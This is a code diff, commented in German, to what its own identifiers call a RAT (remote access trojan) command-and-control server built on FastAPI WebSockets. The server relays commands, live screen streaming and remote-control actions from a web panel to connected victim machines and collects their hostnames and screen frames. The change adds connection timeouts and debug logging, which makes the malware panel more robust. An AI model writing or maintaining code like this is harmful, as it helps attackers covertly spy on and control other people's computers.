@@ -59,16 +59,28 @@ async def websocket_endpoint(websocket: WebSocket):
     await websocket.accept()
     WEB_UI_SOCKET = websocket
     print("Web-UI verbunden.")
-
     await send_client_list()
     try:
         while True:
-            data = await websocket.receive_json()
+            try:
+                data = await asyncio.wait_for(websocket.receive_json(), timeout=180)
+            except asyncio.TimeoutError:
+                print("[Web-UI] Timeout, Verbindung wird geschlossen.")
+                await send_to_web_ui({"type": "debug", "level": "warn", "msg": "Web-UI Timeout, Verbindung geschlossen."})
+                break
+            except Exception as e:
+                print(f"[Web-UI] Fehler: {e}")
+                await send_to_web_ui({"type": "debug", "level": "error", "msg": f"Web-UI Fehler: {e}"})
+                break
+
             # --- Screenstream/Control Weiterleitung ---
             if data.get('action') in ('screenstream_start', 'screenstream_stop', 'control'):
                 target = data.get('client_id')
                 if target in RAT_CLIENTS:
                     await RAT_CLIENTS[target].send_json(data)
+                    await send_to_web_ui({"type": "debug", "level": "info", "msg": f"Screenstream/Control an Client {target} weitergeleitet."})
+                else:
+                    await send_to_web_ui({"type": "debug", "level": "warn", "msg": f"Client {target} nicht verbunden."})
                 continue
             # --- Standard-Kommandos ---
             action = data.get("action")
@@ -77,6 +89,7 @@ async def websocket_endpoint(websocket: WebSocket):
                 await send_to_web_ui(
                     {"type": "error", "message": "Client nicht gefunden oder nicht ausgewählt."}
                 )
+                await send_to_web_ui({"type": "debug", "level": "warn", "msg": "Client nicht gefunden für Befehl."})
                 continue
             target_ws = RAT_CLIENTS[target_id]
             payload = {"action": action}
@@ -97,13 +110,16 @@ async def websocket_endpoint(websocket: WebSocket):
                 pass
             try:
                 await target_ws.send_json(payload)
-            except Exception:
+                await send_to_web_ui({"type": "debug", "level": "info", "msg": f"Befehl '{action}' an Client {target_id} gesendet."})
+            except Exception as e:
                 await send_to_web_ui(
                     {"type": "error", "message": f"Verbindung zu Client {target_id} verloren."}
                 )
+                await send_to_web_ui({"type": "debug", "level": "error", "msg": f"Fehler beim Senden an Client {target_id}: {e}"})
     except WebSocketDisconnect:
         print("Web-UI hat die Verbindung getrennt.")
         WEB_UI_SOCKET = None
+        await send_to_web_ui({"type": "debug", "level": "warn", "msg": "Web-UI hat die Verbindung getrennt."})
 
 # --- Hilfsfunktion: Sende aktuelle Client-Liste ---
 async def send_client_list():
@@ -170,11 +186,17 @@ async def rat_client_endpoint(websocket: WebSocket):
         }
     )
     await send_client_list()
+    await send_to_web_ui({"type": "debug", "level": "info", "msg": f"Neuer Client {hostname} ({client_id}) verbunden."})
 
     try:
         screen_meta = None
         while True:
-            data = await websocket.receive()
+            try:
+                data = await asyncio.wait_for(websocket.receive(), timeout=180)
+            except asyncio.TimeoutError:
+                print(f"[Client {client_id}] Timeout, Verbindung wird geschlossen.")
+                await send_to_web_ui({"type": "debug", "level": "warn", "msg": f"Client {client_id} Timeout, Verbindung geschlossen."})
+                break
             if data["type"] == "websocket.receive":
                 if "bytes" in data and data["bytes"]:
                     # Binärdaten: Screenstream-Frame
@@ -187,6 +209,7 @@ async def rat_client_endpoint(websocket: WebSocket):
                             "height": screen_meta.get("height"),
                         })
                         screen_meta = None
+                        await send_to_web_ui({"type": "debug", "level": "info", "msg": f"Screenstream-Frame von Client {client_id} empfangen."})
                     continue
                 elif "text" in data and data["text"]:
                     try:
@@ -197,10 +220,12 @@ async def rat_client_endpoint(websocket: WebSocket):
                         # Standard-Kommandos
                         meta["client_id"] = client_id
                         await send_to_web_ui(meta)
-                    except Exception:
-                        pass
+                        await send_to_web_ui({"type": "debug", "level": "info", "msg": f"Nachricht von Client {client_id}: {meta.get('action')}"})
+                    except Exception as e:
+                        await send_to_web_ui({"type": "debug", "level": "error", "msg": f"Fehler beim Parsen von Client {client_id}: {e}"})
     except WebSocketDisconnect:
         print(f"[-] RAT-Client {client_id} ({CLIENT_INFOS.get(client_id, {}).get('hostname', client_id)}) hat die Verbindung getrennt.")
+        await send_to_web_ui({"type": "debug", "level": "warn", "msg": f"Client {client_id} hat die Verbindung getrennt."})
     finally:
         if client_id in RAT_CLIENTS:
             del RAT_CLIENTS[client_id]
